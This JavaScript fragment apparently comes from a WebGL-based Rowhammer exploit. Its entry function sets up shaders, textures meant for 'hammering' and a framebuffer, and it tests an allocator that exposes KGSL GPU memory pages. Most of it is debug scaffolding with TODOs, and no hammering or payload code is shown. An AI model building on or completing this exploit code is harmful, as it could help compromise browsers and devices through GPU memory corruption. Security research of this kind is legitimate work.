/**
* Entry point of the exploit
*/
async function glitch() {
    // create gl context
    initGL();
    initFramebuffer();
    
    // enable shaders too be used
    shader = new Shader('vertex-shader', 'fragment-shader');
    shader.use();


    // create debug requirements
    initDebug();
    prepareHammerTime();
    gl.drawArrays(gl.TRIANGLES, 0, 6);
    viewFramebuffer();
}

function prepareHammerTime() {
    // TODO: this is only for testing purposes
    const textures = [];
    for (let i = 0; i < 9; i++) {
        const t = createTexture2DRGBA(createUint8Array(KB4, i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
        textures.push(t);
    }
    for (let i = 0; i < 9; i++) {
        shader.bindTexture(textures[i], i, 'H', i);
    }

    console.log(textures);

    // TODO: find out why bound textures are shifted by 1
}

async function testAllocator() {
    const allocationPages = 4
    let safeAllocator = new Allocator(allocationPages)
    await safeAllocator._init(1)

    let allocator = new Allocator(allocationPages)
    await allocator._init(0)

    // for (let i = 0; i < allocationPages; i++) {
    //     if (allocator.newKGSL[1].tex_id === safeAllocator.newKGSLSafe[1]) {
    //         console.info(`page ${i} checked`)
    //     }
    //     else {
    //         console.error(`page ${i} failed`)
    //     }
    // }
    console.log(allocator.newKGSL)
    console.log(allocator.newKGSLSafe)
    allocator.clean()
    safeAllocator.clean()
}